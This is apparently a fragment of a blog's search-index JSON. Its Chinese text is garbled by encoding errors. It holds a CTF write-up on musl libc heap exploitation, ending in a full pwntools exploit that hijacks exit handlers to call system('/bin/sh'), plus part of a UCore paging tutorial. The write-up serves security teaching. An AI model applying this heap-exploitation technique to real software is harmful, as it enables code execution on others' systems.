(!new) return 0; copy_free_ret: memcpy(new, p, n0-OVERHEAD); // æ•°æ®æ‹·è´ free(CHUNK_TO_MEM(self)); // free åŸæ¥çš„chunk return new; } p == NULLï¼šmallocï¼ˆnewï¼‰ p != NULLï¼šæ— è®ºå¦‚ä½•éƒ½å°è¯•å‰ååˆå¹¶ new\u003c=oldï¼šåˆ†å‰² new\u003eoldï¼š å¯ä»¥æ»¡è¶³ï¼šè¿”å›chunkæŒ‡é’ˆ ä¸èƒ½æ»¡è¶³ï¼šmalloc(new) new == 0 ï¼šchunkè¢«æ”¾å…¥binä¸­ ","date":"2021-08-22","objectID":"/musl-libc-pwn-learning/:7:0","series":null,"tags":["Pwn"],"title":"Musl Libc Pwn Learning","uri":"/musl-libc-pwn-learning/#realloc"},{"categories":["Pwning"],"content":"ä¾‹é¢˜ï¼šBSides Noida CTFyudaiå¸ˆå‚…akäº†pwnå¤ªå¼ºäº†ã€‚ new unsigned __int64 new() { __int64 v0; // rbx __int64 v2; // [rsp+8h] [rbp-28h] BYREF size_t size; // [rsp+10h] [rbp-20h] BYREF unsigned __int64 v4; // [rsp+18h] [rbp-18h] v4 = __readfsqword(0x28u); puts(\"Enter index\"); scanf(\"%lu\", \u0026v2); puts(\"Enter size\"); scanf(\"%lu\", \u0026size); v0 = v2; chunks[v0] = malloc(size); data[v2] = size; return __readfsqword(0x28u) ^ v4; } del unsigned __int64 del() { unsigned __int64 v1; // [rsp+0h] [rbp-10h] BYREF unsigned __int64 v2; // [rsp+8h] [rbp-8h] v2 = __readfsqword(0x28u); puts(\"Enter index\"); scanf(\"%lu\", \u0026v1); if ( v1 \u003c= 3 \u0026\u0026 chunks[v1] ) free((void *)chunks[v1]); return __readfsqword(0x28u) ^ v2; } edit unsigned __int64 edit() { unsigned __int64 idx; // [rsp+0h] [rbp-10h] BYREF unsigned __int64 v2; // [rsp+8h] [rbp-8h] v2 = __readfsqword(0x28u); puts(\"Enter index\"); scanf(\"%lu\", \u0026idx); if ( idx \u003c= 3 \u0026\u0026 chunks[idx] ) { puts(\"Enter data\"); read(0, (void *)chunks[idx], (int)data[idx]); } return __readfsqword(0x28u) ^ v2; } show unsigned __int64 show() { __int64 v1; // [rsp+0h] [rbp-10h] BYREF unsigned __int64 v2; // [rsp+8h] [rbp-8h] v2 = __readfsqword(0x28u); puts(\"Enter index\"); scanf(\"%lu\", \u0026v1); puts((const char *)chunks[v1]); return __readfsqword(0x28u) ^ v2; } å¯ä»¥æ˜æ˜¾çœ‹åˆ°uafï¼Œåœ¨newä¸­æ²¡æœ‰å¤„ç†ä¸‹æ ‡ï¼Œå¯ä»¥è¦†ç›–dataæ•°ç»„å®ç°æº¢å‡ºã€‚musl libcçš„ubbinå¯è¿›è¡Œä»»æ„åœ°å€å†™ä»»æ„å€¼ï¼Œå…³é”®ç‚¹æ˜¯å‘ä»€ä¹ˆåœ°æ–¹å†™ä»€ä¹ˆä¸œè¥¿æ‰èƒ½åŠ«æŒç¨‹åºæµç¨‹ã€‚ ","date":"2021-08-22","objectID":"/musl-libc-pwn-learning/:8:0","series":null,"tags":["Pwn"],"title":"Musl Libc Pwn Learning","uri":"/musl-libc-pwn-learning/#ä¾‹é¢˜bsides-noida-ctf"},{"categories":["Pwning"],"content":"exitåŠ«æŒæŸ¥çœ‹exitæºç ï¼š _Noreturn void exit(int code) { __funcs_on_exit(); __libc_exit_fini(); __stdio_exit(); _Exit(code); } /* Ensure that at least 32 atexit handlers can be registered without malloc */ #define COUNT 32 static struct fl { struct fl *next; // +0x00 8 Bytes void (*f[COUNT])(void *); // +0x08 8*32 Bytes void *a[COUNT]; // +0x108 8*32 Bytes } builtin, *head; // 0x208 512 Bytes [...] void __funcs_on_exit() { void (*func)(void *), *arg; LOCK(lock); for (; head; head=head-\u003enext, slot=COUNT) while(slot--\u003e0) { func = head-\u003ef[slot]; arg = head-\u003ea[slot]; UNLOCK(lock); func(arg); LOCK(lock); } } åœ¨__funcs_on_exitä¸­è°ƒç”¨äº†å¤šä¸ªå‡½æ•°ï¼Œæˆ‘ä»¬å¯¹exitè¿›è¡Œè°ƒè¯•ã€‚ â–º 0x7f1bd68c1080 \u003cexit\u003e endbr64 0x7f1bd68c1084 \u003cexit+4\u003e push rbp 0x7f1bd68c1085 \u003cexit+5\u003e mov ebp, edi 0x7f1bd68c1087 \u003cexit+7\u003e call 0x7f1bd68cb570 \u003c0x7f1bd68cb570\u003e 0x7f1bd68c108c \u003cexit+12\u003e call 0x7f1bd6921f80 \u003c0x7f1bd6921f80\u003e 0x7f1bd68c1091 \u003cexit+17\u003e xor eax, eax 0x7f1bd68c1093 \u003cexit+19\u003e call 0x7f1bd6906ca0 \u003c0x7f1bd6906ca0\u003e 0x7f1bd68c1098 \u003cexit+24\u003e mov edi, ebp 0x7f1bd68c109a \u003cexit+26\u003e call _Exit \u003c_Exit\u003e å¯¹åº”æºç ä¸­å››ä¸ªå‡½æ•° __funcs_on_exitå¯¹åº”æ±‡ç¼–å¦‚ä¸‹ï¼š =\u003e 0x7f1bd68cb570: endbr64 0x7f1bd68cb574: push r12 0x7f1bd68cb576: lea rdi,[rip+0x93beb] # 0x7f1bd695f168 0x7f1bd68cb57d: push rbp 0x7f1bd68cb57e: push rbx 0x7f1bd68cb57f: call 0x7f1bd6915500 # LOCK(lock) 0x7f1bd68cb584: mov rdx,QWORD PTR [rip+0x939cd] # 0x7f1bd695ef58 0x7f1bd68cb58b: test rdx,rdx # head 0x7f1bd68cb58e: je 0x7f1bd68cb630 0x7f1bd68cb594: mov ecx,DWORD PTR [rip+0x93bd2] # 0x7f1bd695f16c 0x7f1bd68cb59a: lea eax,[rcx-0x1] 0x7f1bd68cb59d: mov DWORD PTR [rip+0x93bc9],eax # 0x7f1bd695f16c 0x7f1bd68cb5a3: test ecx,ecx # slot 0x7f1bd68cb5a5: jle 0x7f1bd68cb600 0x7f1bd68cb5a7: nop WORD PTR [rax+rax*1+0x0] 0x7f1bd68cb5b0: lea rbx,[rip+0x93bb1] # 0x7f1bd695f168 lock 0x7f1bd68cb5b7: nop WORD PTR [rax+rax*1+0x0] 0x7f1bd68cb5c0: cdqe 0x7f1bd68cb5c2: mov rdi,rbx 0x7f1bd68cb5c5: lea rax,[rdx+rax*8] 0x7f1bd68cb5c9: mov r12,QWORD PTR [rax+0x108] # arg 0x7f1bd68cb5d0: mov rbp,QWORD PTR [rax+0x8] # func 0x7f1bd68cb5d4: call 0x7f1bd69155d0 # UNLOCK(lock) 0x7f1bd68cb5d9: mov rdi,r12 0x7f1bd68cb5dc: call rbp # \u003c--- func(arg) 0x7f1bd68cb5de: mov rdi,rbx 0x7f1bd68cb5e1: call 0x7f1bd6915500 # LOCK(lock) 0x7f1bd68cb5e6: mov edx,DWORD PTR [rip+0x93b80] # 0x7f1bd695f16c 0x7f1bd68cb5ec: lea eax,[rdx-0x1] 0x7f1bd68cb5ef: test edx,edx # slot 0x7f1bd68cb5f1: mov rdx,QWORD PTR [rip+0x93960] # 0x7f1bd695ef58 0x7f1bd68cb5f8: mov DWORD PTR [rip+0x93b6e],eax # 0x7f1bd695f16c 0x7f1bd68cb5fe: jg 0x7f1bd68cb5c0 0x7f1bd68cb600: mov DWORD PTR [rip+0x93b62],0x20 # 0x7f1bd695f16c 0x7f1bd68cb60a: mov rdx,QWORD PTR [rdx] 0x7f1bd68cb60d: mov QWORD PTR [rip+0x93944],rdx # 0x7f1bd695ef58 0x7f1bd68cb614: test rdx,rdx # head 0x7f1bd68cb617: je 0x7f1bd68cb630 0x7f1bd68cb619: mov DWORD PTR [rip+0x93b49],0x1f # 0x7f1bd695f16c 0x7f1bd68cb623: mov eax,0x1f 0x7f1bd68cb628: jmp 0x7f1bd68cb5b0 0x7f1bd68cb62a: nop WORD PTR [rax+rax*1+0x0] 0x7f1bd68cb630: pop rbx 0x7f1bd68cb631: pop rbp 0x7f1bd68cb632: pop r12 0x7f1bd68cb634: ret ç»è¿‡åˆ†æï¼Œheadçš„åœ°å€ä¸º0x7f1bd695ef58 pwndbg\u003e tele 0x7f1bd695ef58 00:0000â”‚ 0x7f1bd695ef58 â€”â–¸ 0x7f1bd695f3e0 â—‚â€” 0x7f1bd695f3e0 01:0008â”‚ 0x7f1bd695ef60 (program_invocation_name) â€”â–¸ 0x7ffe5ce0216a â—‚â€” './baby_musl' 02:0010â”‚ 0x7f1bd695ef68 (program_invocation_short_name) â€”â–¸ 0x7ffe5ce0216c â—‚â€” 'baby_musl' 03:0018â”‚ 0x7f1bd695ef70 â—‚â€” 0x0 pwndbg\u003e vmmap LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA 0x556d8f800000 0x556d8f801000 r-xp 1000 0 /home/neibelungen/Desktop/PWN/BSCTF/baby_musl/baby_musl 0x556d8fa01000 0x556d8fa02000 r--p 1000 1000 /home/neibelungen/Desktop/PWN/BSCTF/baby_musl/baby_musl 0x556d8fa02000 0x556d8fa03000 rw-p 1000 2000 /home/neibelungen/Desktop/PWN/BSCTF/baby_musl/baby_musl 0x7f1bd68ac000 0x7f1bd68c1000 r--p 15000 0 /usr/lib/x86_64-linux-musl/libc.so 0x7f1bd68c1000 0x7f1bd6925000 r-xp 64000 15000 /usr/lib/x86_64-linux-musl/libc.so 0x7f1bd6925000 0x7f1bd695b000 r--p 36000 79000 /usr/lib/x86_64-linux-musl/libc.so 0x7f1bd695b000 0x7f1bd695c000 r--p 1000 ae000 /usr/lib/x86_64-linux-musl/l","date":"2021-08-22","objectID":"/musl-libc-pwn-learning/:8:1","series":null,"tags":["Pwn"],"title":"Musl Libc Pwn Learning","uri":"/musl-libc-pwn-learning/#exitåŠ«æŒ"},{"categories":["Pwning"],"content":"exp from pwn import * binary = './baby_musl' # context.terminal = ['tmux', 'splitw', '-h'] context(binary=binary, log_level='debug') p = process(binary) # p = remote('chall.pwnable.tw',10202) elf = ELF(binary) libc = ELF('/usr/lib/x86_64-linux-musl/libc.so') def leak(name, addr): return log.success( '{0}addr ---\u003e {1}'.format(name, hex(addr))) def cmd(idx): p.sendlineafter('[4] Show', str(idx)) def add(idx, size): cmd(1) p.sendlineafter('Enter index', str(idx)) p.sendlineafter('Enter size', str(size)) def dele(idx): cmd(2) p.sendlineafter('Enter index', str(idx)) def edit(idx, data): cmd(3) p.sendlineafter('Enter index', str(idx)) p.sendafter('Enter data', data) def show(idx): cmd(4) p.sendlineafter('Enter index', str(idx)) p.sendline('Niebelungen') add(0, 0x18) show(0) libc_base = u64(p.recvuntil('\\x7f')[-6:].ljust(8, b'\\x00')) - 0xb0dd0 fake_fl = libc_base + 0xb33e0 head_addr = libc_base + 0xb2f58 - 0x10 system = libc_base + libc.sym['system'] binsh = libc_base+next(libc.search('/bin/sh')) leak('libc addr', libc_base) add(1, 0x60) add(2, 0x208) # fake_fl dele(1) edit(1, p64(fake_fl) + p64(head_addr)) payload = p64(fake_fl) payload += b'A' * 0xf8 payload += p64(system) payload += b'A' * 0xf8 payload += p64(binsh) edit(2, payload) # gdb.attach(p) add(1, 0x10) p.sendline('0') p.interactive() ","date":"2021-08-22","objectID":"/musl-libc-pwn-learning/:8:2","series":null,"tags":["Pwn"],"title":"Musl Libc Pwn Learning","uri":"/musl-libc-pwn-learning/#exp"},{"categories":["Pwning"],"content":"åœ¨æ­£å¼å¼€å§‹å†™ä»£ç ä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆçœ‹çœ‹ï¼Œæ•´ä¸ªå†…å­˜ç®¡ç†çš„æ¡†æ¶ å‚è€ƒï¼šå†…å­˜ç®¡ç†è¿·é›¾ ","date":"2021-07-10","objectID":"/ucore-lab-2/:0:0","series":null,"tags":["Pwn"],"title":"UCore Lab 2","uri":"/ucore-lab-2/#"},{"categories":["Pwning"],"content":"è™šæ‹Ÿå†…å­˜åœ¨è™šæ‹Ÿåœ°å€äº§ç”Ÿä¹‹å‰ï¼Œcpuä¸­ä½¿ç”¨çš„éƒ½æ˜¯ç‰©ç†åœ°å€ã€‚æ‰€æœ‰çš„ç¨‹åºé¢å¯¹çš„éƒ½æ˜¯ä¸»å­˜çš„é‚£å—ç©ºé—´ã€‚è¿™é€ æˆäº†ä¸€ä¸ªé—®é¢˜ï¼Œå¦‚æœä¸¤ä¸ªç¨‹åºä¹‹é—´å…±äº«äº†ä¸€å—ç‰©ç†å†…å­˜ç©ºé—´ï¼Œè¿™ä¸¤ä¸ªç¨‹åºå°±ä¼šç›¸äº’å½±å“ã€‚æ— è®ºé‚£å—åŒºåŸŸå­˜æ”¾çš„æ˜¯ä»€ä¹ˆï¼Œè¢«ä¿®æ”¹ä¹‹åï¼Œå°±ææœ‰å¯èƒ½é€ æˆç¨‹åºçš„å´©æºƒã€‚è¿™æ ·æ ¹æœ¬æ— æ³•è¿è¡Œå¤šä¸ªç¨‹åºã€‚ è¿™é‡Œå…³é”®çš„é—®é¢˜æ˜¯è¿™ä¸¤ä¸ªç¨‹åºéƒ½å¼•ç”¨äº†ç»å¯¹ç‰©ç†åœ°å€ï¼Œè€Œè¿™æ­£æ˜¯æˆ‘ä»¬æœ€éœ€è¦é¿å…çš„ã€‚ æˆ‘ä»¬å¯ä»¥æŠŠè¿›ç¨‹æ‰€ä½¿ç”¨çš„åœ°å€éš”ç¦»å¼€æ¥ï¼Œå³è®©æ“ä½œç³»ç»Ÿä¸ºæ¯ä¸ªè¿›ç¨‹åˆ†é…ç‹¬ç«‹çš„ä¸€å¥—è™šæ‹Ÿåœ°å€ï¼Œæ¯ä¸ªè¿›ç¨‹é¢å¯¹çš„åŒæ ·å¤§å°çš„è™šæ‹Ÿå†…å­˜ç©ºé—´ï¼Œä½†æ‰€å¯¹åº”çš„ç‰©ç†åœ°å€ä¸åŒã€‚ å¦‚æœç¨‹åºè¦è®¿é—®è™šæ‹Ÿåœ°å€çš„æ—¶å€™ï¼Œç”±æ“ä½œç³»ç»Ÿè½¬æ¢æˆä¸åŒçš„ç‰©ç†åœ°å€ï¼Œè¿™æ ·ä¸åŒçš„è¿›ç¨‹è¿è¡Œçš„æ—¶å€™ï¼Œå†™å…¥çš„æ˜¯ä¸åŒçš„ç‰©ç†åœ°å€ï¼Œè¿™æ ·å°±ä¸ä¼šå†²çªäº†ã€‚ äºæ˜¯ï¼Œè¿™é‡Œå°±å¼•å‡ºäº†ä¸¤ç§åœ°å€çš„æ¦‚å¿µï¼š æˆ‘ä»¬ç¨‹åºæ‰€ä½¿ç”¨çš„å†…å­˜åœ°å€å«åšè™šæ‹Ÿå†…å­˜åœ°å€ï¼ˆVirtual Memory Addressï¼‰ å®é™…å­˜åœ¨ç¡¬ä»¶é‡Œé¢çš„ç©ºé—´åœ°å€å«ç‰©ç†å†…å­˜åœ°å€ï¼ˆPhysical Memory Addressï¼‰ã€‚ æ“ä½œç³»ç»Ÿå¼•å…¥äº†è™šæ‹Ÿå†…å­˜ï¼Œè¿›ç¨‹æŒæœ‰çš„è™šæ‹Ÿåœ°å€ä¼šé€šè¿‡ CPU èŠ¯ç‰‡ä¸­çš„å†…å­˜ç®¡ç†å•å…ƒï¼ˆMMUï¼‰çš„æ˜ å°„å…³ç³»ï¼Œæ¥è½¬æ¢å˜æˆç‰©ç†åœ°å€ï¼Œç„¶åå†é€šè¿‡ç‰©ç†åœ°å€è®¿é—®å†…å­˜ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š ","date":"2021-07-10","objectID":"/ucore-lab-2/:0:0","series":null,"tags":["Pwn"],"title":"UCore Lab 2","uri":"/ucore-lab-2/#è™šæ‹Ÿå†…å­˜"},{"categories":["Pwning"],"content":"å†…å­˜åˆ†æ®µç¨‹åºæ˜¯ç”±è‹¥å¹²ä¸ªé€»è¾‘åˆ†æ®µç»„æˆçš„ï¼Œå¦‚å¯ç”±ä»£ç åˆ†æ®µã€æ•°æ®åˆ†æ®µã€æ ˆæ®µã€å †æ®µç»„æˆã€‚ä¸åŒçš„æ®µæ˜¯æœ‰ä¸åŒçš„å±æ€§çš„ï¼Œæ‰€ä»¥å°±ç”¨åˆ†æ®µï¼ˆSegmentationï¼‰çš„å½¢å¼æŠŠè¿™äº›æ®µåˆ†ç¦»å‡ºæ¥ã€‚ å…³äºåˆ†æ®µçš„æ˜ å°„æˆ‘ä»¬åœ¨lab1ä¸­è¯´è¿‡ï¼Œæ˜¯é€šè¿‡æ®µé€‰æ‹©å­å’Œåç§»å¾—åˆ°ç‰©ç†åœ°å€çš„ã€‚ç°åœ¨æˆ‘ä»¬çŸ¥é“äº†è™šæ‹Ÿåœ°å€æ˜¯é€šè¿‡æ®µè¡¨ä¸ç‰©ç†åœ°å€è¿›è¡Œæ˜ å°„çš„ï¼Œåˆ†æ®µæœºåˆ¶ä¼šæŠŠç¨‹åºçš„è™šæ‹Ÿåœ°å€åˆ†æˆ 4 ä¸ªæ®µï¼Œæ¯ä¸ªæ®µåœ¨æ®µè¡¨ä¸­æœ‰ä¸€ä¸ªé¡¹ï¼Œåœ¨è¿™ä¸€é¡¹æ‰¾åˆ°æ®µçš„åŸºåœ°å€ï¼Œå†åŠ ä¸Šåç§»é‡ï¼Œäºæ˜¯å°±èƒ½æ‰¾åˆ°ç‰©ç†å†…å­˜ä¸­çš„åœ°å€ï¼Œå¦‚ä¸‹å›¾ï¼š åˆ†æ®µçš„åŠæ³•å¾ˆå¥½ï¼Œè§£å†³äº†ç¨‹åºæœ¬èº«ä¸éœ€è¦å…³å¿ƒå…·ä½“çš„ç‰©ç†å†…å­˜åœ°å€çš„é—®é¢˜ï¼Œä½†å®ƒä¹Ÿæœ‰ä¸€äº›ä¸è¶³ä¹‹å¤„ï¼š ç¬¬ä¸€ä¸ªå°±æ˜¯å†…å­˜ç¢ç‰‡çš„é—®é¢˜ã€‚ ç¬¬äºŒä¸ªå°±æ˜¯å†…å­˜äº¤æ¢çš„æ•ˆç‡ä½çš„é—®é¢˜ã€‚ ","date":"2021-07-10","objectID":"/ucore-lab-2/:0:0","series":null,"tags":["Pwn"],"title":"UCore Lab 2","uri":"/ucore-lab-2/#å†…å­˜åˆ†æ®µ"},{"categories":["Pwning"],"content":"å†…å­˜ç¢ç‰‡æˆ‘ä»¬æ¥çœ‹çœ‹è¿™æ ·ä¸€ä¸ªä¾‹å­ã€‚å‡è®¾æœ‰ 1G çš„ç‰©ç†å†…å­˜ï¼Œç”¨æˆ·æ‰§è¡Œäº†å¤šä¸ªç¨‹åºï¼Œå…¶ä¸­ï¼š æ¸¸æˆå ç”¨äº† 512MB å†…å­˜ æµè§ˆå™¨å ç”¨äº† 128MB å†…å­˜ éŸ³ä¹å ç”¨äº† 256 MB å†…å­˜ã€‚ è¿™ä¸ªæ—¶å€™ï¼Œå¦‚æœæˆ‘ä»¬å…³é—­äº†æµè§ˆå™¨ï¼Œåˆ™ç©ºé—²å†…å­˜è¿˜æœ‰ 1024 - 512 - 256 = 256MBã€‚å¦‚æœè¿™ä¸ª 256MB ä¸æ˜¯è¿ç»­çš„ï¼Œè¢«åˆ†æˆäº†ä¸¤æ®µ 128 MB å†…å­˜ï¼Œè¿™å°±ä¼šå¯¼è‡´æ²¡æœ‰ç©ºé—´å†æ‰“å¼€ä¸€ä¸ª 200MB çš„ç¨‹åºã€‚ å†…å­˜ç¢ç‰‡çš„é—®é¢˜è¿™é‡Œçš„å†…å­˜ç¢ç‰‡çš„é—®é¢˜å…±æœ‰ä¸¤å¤„åœ°æ–¹ï¼š å¤–éƒ¨å†…å­˜ç¢ç‰‡ï¼Œä¹Ÿå°±æ˜¯äº§ç”Ÿäº†å¤šä¸ªä¸è¿ç»­çš„å°ç‰©ç†å†…å­˜ï¼Œå¯¼è‡´æ–°çš„ç¨‹åºæ— æ³•è¢«è£…è½½ï¼› å†…éƒ¨å†…å­˜ç¢ç‰‡ï¼Œç¨‹åºæ‰€æœ‰çš„å†…å­˜éƒ½è¢«è£…è½½åˆ°äº†ç‰©ç†å†…å­˜ï¼Œä½†æ˜¯è¿™ä¸ªç¨‹åºæœ‰éƒ¨åˆ†çš„å†…å­˜å¯èƒ½å¹¶ä¸æ˜¯å¾ˆå¸¸ä½¿ç”¨ï¼Œè¿™ä¹Ÿä¼šå¯¼è‡´å†…å­˜çš„æµªè´¹ï¼› é’ˆå¯¹ä¸Šé¢ä¸¤ç§å†…å­˜ç¢ç‰‡çš„é—®é¢˜ï¼Œè§£å†³çš„æ–¹å¼ä¼šæœ‰æ‰€ä¸åŒã€‚è§£å†³å¤–éƒ¨å†…å­˜ç¢ç‰‡çš„é—®é¢˜å°±æ˜¯å†…å­˜äº¤æ¢ã€‚å¯ä»¥æŠŠéŸ³ä¹ç¨‹åºå ç”¨çš„é‚£ 256MB å†…å­˜å†™åˆ°ç¡¬ç›˜ä¸Šï¼Œç„¶åå†ä»ç¡¬ç›˜ä¸Šè¯»å›æ¥åˆ°å†…å­˜é‡Œã€‚ä¸è¿‡å†è¯»å›çš„æ—¶å€™ï¼Œæˆ‘ä»¬ä¸èƒ½è£…è½½å›åŸæ¥çš„ä½ç½®ï¼Œè€Œæ˜¯ç´§ç´§è·Ÿç€é‚£å·²ç»è¢«å ç”¨äº†çš„ 512MB å†…å­˜åé¢ã€‚è¿™æ ·å°±èƒ½ç©ºç¼ºå‡ºè¿ç»­çš„ 256MB ç©ºé—´ï¼Œäºæ˜¯æ–°çš„ 200MB ç¨‹åºå°±å¯ä»¥è£…è½½è¿›æ¥ã€‚è¿™ä¸ªå†…å­˜äº¤æ¢ç©ºé—´ï¼Œåœ¨ Linux ç³»ç»Ÿé‡Œï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬å¸¸çœ‹åˆ°çš„ Swap ç©ºé—´ï¼Œè¿™å—ç©ºé—´æ˜¯ä»ç¡¬ç›˜åˆ’åˆ†å‡ºæ¥çš„ï¼Œç”¨äºå†…å­˜ä¸ç¡¬ç›˜çš„ç©ºé—´äº¤æ¢ã€‚ ","date":"2021-07-10","objectID":"/ucore-lab-2/:1:0","series":null,"tags":["Pwn"],"title":"UCore Lab 2","uri":"/ucore-lab-2/#å†…å­˜ç¢ç‰‡"},{"categories":["Pwning"],"content":"å†…å­˜äº¤æ¢æ•ˆç‡å¯¹äºå¤šè¿›ç¨‹çš„ç³»ç»Ÿæ¥è¯´ï¼Œç”¨åˆ†æ®µçš„æ–¹å¼ï¼Œå†…å­˜ç¢ç‰‡æ˜¯å¾ˆå®¹æ˜“äº§ç”Ÿçš„ï¼Œäº§ç”Ÿäº†å†…å­˜ç¢ç‰‡ï¼Œé‚£ä¸å¾—ä¸é‡æ–° Swap å†…å­˜åŒºåŸŸï¼Œè¿™ä¸ªè¿‡ç¨‹ä¼šäº§ç”Ÿæ€§èƒ½ç“¶é¢ˆã€‚å› ä¸ºç¡¬ç›˜çš„è®¿é—®é€Ÿåº¦è¦æ¯”å†…å­˜æ…¢å¤ªå¤šäº†ï¼Œæ¯ä¸€æ¬¡å†…å­˜äº¤æ¢ï¼Œæˆ‘ä»¬éƒ½éœ€è¦æŠŠä¸€å¤§æ®µè¿ç»­çš„å†…å­˜æ•°æ®å†™åˆ°ç¡¬ç›˜ä¸Šã€‚æ‰€ä»¥ï¼Œå¦‚æœå†…å­˜äº¤æ¢çš„æ—¶å€™ï¼Œäº¤æ¢çš„æ˜¯ä¸€ä¸ªå å†…å­˜ç©ºé—´å¾ˆå¤§çš„ç¨‹åºï¼Œè¿™æ ·æ•´ä¸ªæœºå™¨éƒ½ä¼šæ˜¾å¾—å¡é¡¿ã€‚ä¸ºäº†è§£å†³å†…å­˜åˆ†æ®µçš„å†…å­˜ç¢ç‰‡å’Œå†…å­˜äº¤æ¢æ•ˆç‡ä½çš„é—®é¢˜ï¼Œå°±å‡ºç°äº†å†…å­˜åˆ†é¡µã€‚ ","date":"2021-07-10","objectID":"/ucore-lab-2/:2:0","series":null,"tags":["Pwn"],"title":"UCore Lab 2","uri":"/ucore-lab-2/#å†…å­˜äº¤æ¢æ•ˆç‡"},{"categories":["Pwning"],"content":"å†…å­˜åˆ†é¡µåˆ†æ®µçš„å¥½å¤„å°±æ˜¯èƒ½äº§ç”Ÿè¿ç»­çš„å†…å­˜ç©ºé—´ï¼Œä½†æ˜¯ä¼šå‡ºç°å†…å­˜ç¢ç‰‡å’Œå†…å­˜äº¤æ¢çš„ç©ºé—´å¤ªå¤§çš„é—®é¢˜ã€‚è¦è§£å†³è¿™äº›é—®é¢˜ï¼Œé‚£ä¹ˆå°±è¦æƒ³å‡ºèƒ½å°‘å‡ºç°ä¸€äº›å†…å­˜ç¢ç‰‡çš„åŠæ³•ã€‚å¦å¤–ï¼Œå½“éœ€è¦è¿›è¡Œå†…å­˜äº¤æ¢çš„æ—¶å€™ï¼Œè®©éœ€è¦äº¤æ¢å†™å…¥æˆ–è€…ä»ç£ç›˜è£…è½½çš„æ•°æ®æ›´å°‘ä¸€ç‚¹ï¼Œè¿™æ ·å°±å¯ä»¥è§£å†³é—®é¢˜äº†ã€‚è¿™ä¸ªåŠæ³•ï¼Œä¹Ÿå°±æ˜¯å†…å­˜åˆ†é¡µï¼ˆPagingï¼‰ã€‚åˆ†é¡µæ˜¯æŠŠæ•´ä¸ªè™šæ‹Ÿå’Œç‰©ç†å†…å­˜ç©ºé—´åˆ‡æˆä¸€æ®µæ®µå›ºå®šå°ºå¯¸çš„å¤§å°ã€‚è¿™æ ·ä¸€ä¸ªè¿ç»­å¹¶ä¸”å°ºå¯¸å›ºå®šçš„å†…å­˜ç©ºé—´ï¼Œæˆ‘ä»¬å«é¡µï¼ˆPageï¼‰ã€‚åœ¨ Linux ä¸‹ï¼Œæ¯ä¸€é¡µçš„å¤§å°ä¸º 4KBã€‚è™šæ‹Ÿåœ°å€ä¸ç‰©ç†åœ°å€ä¹‹é—´é€šè¿‡é¡µè¡¨æ¥æ˜ å°„ï¼Œå¦‚ä¸‹å›¾ï¼š å†…å­˜æ˜ å°„é¡µè¡¨å®é™…ä¸Šå­˜å‚¨åœ¨ CPU çš„å†…å­˜ç®¡ç†å•å…ƒ ï¼ˆMMU) ä¸­ï¼Œäºæ˜¯ CPU å°±å¯ä»¥ç›´æ¥é€šè¿‡ MMUï¼Œæ‰¾å‡ºè¦å®é™…è¦è®¿é—®çš„ç‰©ç†å†…å­˜åœ°å€ã€‚è€Œå½“è¿›ç¨‹è®¿é—®çš„è™šæ‹Ÿåœ°å€åœ¨é¡µè¡¨ä¸­æŸ¥ä¸åˆ°æ—¶ï¼Œç³»ç»Ÿä¼šäº§ç”Ÿä¸€ä¸ªç¼ºé¡µå¼‚å¸¸ï¼Œè¿›å…¥ç³»ç»Ÿå†…æ ¸ç©ºé—´åˆ†é…ç‰©ç†å†…å­˜ã€æ›´æ–°è¿›ç¨‹é¡µè¡¨ï¼Œæœ€åå†è¿”å›ç”¨æˆ·ç©ºé—´ï¼Œæ¢å¤è¿›ç¨‹çš„è¿è¡Œã€‚ åˆ†é¡µæ˜¯æ€ä¹ˆè§£å†³åˆ†æ®µçš„å†…å­˜ç¢ç‰‡ã€å†…å­˜äº¤æ¢æ•ˆç‡ä½çš„é—®é¢˜ï¼Ÿ ç”±äºå†…å­˜ç©ºé—´éƒ½æ˜¯é¢„å…ˆåˆ’åˆ†å¥½çš„ï¼Œä¹Ÿå°±ä¸ä¼šåƒåˆ†æ®µä¼šäº§ç”Ÿé—´éš™éå¸¸å°çš„å†…å­˜ï¼Œè¿™æ­£æ˜¯åˆ†æ®µä¼šäº§ç”Ÿå†…å­˜ç¢ç‰‡çš„åŸå› ã€‚è€Œé‡‡ç”¨äº†åˆ†é¡µï¼Œé‚£ä¹ˆé‡Šæ”¾çš„å†…å­˜éƒ½æ˜¯ä»¥é¡µä¸ºå•ä½é‡Šæ”¾çš„ï¼Œä¹Ÿå°±ä¸ä¼šäº§ç”Ÿæ— æ³•ç»™è¿›ç¨‹ä½¿ç”¨çš„å°å†…å­˜ã€‚å¦‚æœå†…å­˜ç©ºé—´ä¸å¤Ÿï¼Œæ“ä½œç³»ç»Ÿä¼šæŠŠå…¶ä»–æ­£åœ¨è¿è¡Œçš„è¿›ç¨‹ä¸­çš„ã€Œæœ€è¿‘æ²¡è¢«ä½¿ç”¨ã€çš„å†…å­˜é¡µé¢ç»™é‡Šæ”¾æ‰ï¼Œä¹Ÿå°±æ˜¯æš‚æ—¶å†™åœ¨ç¡¬ç›˜ä¸Šï¼Œç§°ä¸ºæ¢å‡ºï¼ˆSwap Outï¼‰ã€‚ä¸€æ—¦éœ€è¦çš„æ—¶å€™ï¼Œå†åŠ è½½è¿›æ¥ï¼Œç§°ä¸ºæ¢å…¥ï¼ˆSwap Inï¼‰ã€‚æ‰€ä»¥ï¼Œä¸€æ¬¡æ€§å†™å…¥ç£ç›˜çš„ä¹Ÿåªæœ‰å°‘æ•°çš„ä¸€ä¸ªé¡µæˆ–è€…å‡ ä¸ªé¡µï¼Œä¸ä¼šèŠ±å¤ªå¤šæ—¶é—´ï¼Œå†…å­˜äº¤æ¢çš„æ•ˆç‡å°±ç›¸å¯¹æ¯”è¾ƒé«˜ã€‚ æ¢å…¥æ¢å‡ºæ›´è¿›ä¸€æ­¥åœ°ï¼Œåˆ†é¡µçš„æ–¹å¼ä½¿å¾—æˆ‘ä»¬åœ¨åŠ è½½ç¨‹åºçš„æ—¶å€™ï¼Œä¸å†éœ€è¦ä¸€æ¬¡æ€§éƒ½æŠŠç¨‹åºåŠ è½½åˆ°ç‰©ç†å†…å­˜ä¸­ã€‚æˆ‘ä»¬å®Œå…¨å¯ä»¥åœ¨è¿›è¡Œè™šæ‹Ÿå†…å­˜å’Œç‰©ç†å†…å­˜çš„é¡µä¹‹é—´çš„æ˜ å°„ä¹‹åï¼Œå¹¶ä¸çœŸçš„æŠŠé¡µåŠ 